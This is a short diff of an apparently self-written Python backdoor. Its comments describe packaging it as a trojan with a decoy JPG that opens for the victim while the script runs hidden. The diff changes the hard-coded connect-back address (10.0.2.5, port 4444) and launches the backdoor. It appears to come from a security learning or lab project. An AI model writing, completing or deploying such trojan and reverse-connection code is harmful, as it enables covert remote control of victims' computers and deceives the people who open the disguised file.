@@ -84,11 +84,14 @@ class Backdoor:
 # The additional file ("front file") will be opened regularly for the user who has been attacked
 # while the malicious Python script runs in the background, hidden from their eyes.
 # The file name needs to be changed accordingly based on what file we want to package with .py script.
+
+# TODO: The line doesn't work when used as a standalone script (instead as a trojan compiled with jpg file).
+# Comment out those lines to make it work without the trojan strategy.
 file_path = os.path.join(sys._MEIPASS, "python_black.jpg")
 subprocess.Popen(file_path, shell=True)
 
 try:
-    backdoor = Backdoor("10.0.2.15", 4444)
+    backdoor = Backdoor("10.0.2.5", 4444)
     backdoor.run()
 except Exception:
     sys.exit()
